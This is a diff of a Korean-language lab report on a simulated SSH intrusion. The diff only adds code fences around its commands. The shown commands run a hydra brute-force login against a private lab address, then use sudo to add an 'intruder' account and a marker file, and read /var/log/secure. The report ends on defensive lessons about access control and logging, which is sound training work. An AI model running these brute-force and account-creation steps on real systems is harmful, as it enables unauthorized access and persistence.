@@ -30,6 +30,7 @@ Kali 환경에서 다음 명령어를 통해 SSH Brute Force 공격을 수행하
 ```bash
 echo 0000 > pass.txt
 hydra -l target -P pass.txt 192.168.200.81 ssh -t 4 -V
+```
 
 공격 결과, target 계정의 비밀번호가 0000으로 확인되어 SSH 로그인에 성공하였다.
 
@@ -37,9 +38,11 @@ hydra -l target -P pass.txt 192.168.200.81 ssh -t 4 -V
 
 SSH 로그인 이후 sudo 권한을 사용하여 시스템 변경 행위를 수행하였다.
 
+```bash
 sudo useradd intruder
 sudo touch /tmp/compromised_file
 sudo sh -c 'echo "intrusion test" >> /tmp/compromised_file'
+```
 
 수행된 행위는 다음과 같다.
 
@@ -56,7 +59,9 @@ sudo sh -c 'echo "intrusion test" >> /tmp/compromised_file'
 
 침입 이후 /var/log/secure 로그를 통해 인증 성공 및 sudo 실행 기록을 확인하였다.
 
+```bash
 sudo tail -n 30 /var/log/secure
+```
 
 ---
 
@@ -143,6 +148,7 @@ SSH 인증 성공 이후 시스템 계정 생성 및 파일 생성 행위가 연
 
 본 사례는 SSH 접근 통제, 계정 관리, 로그 모니터링의 중요성을 보여주는 대표적인 사례로,
 기본 보안 설정 강화만으로도 유사 침해를 효과적으로 예방할 수 있음을 확인하였다.
+
 
 
 
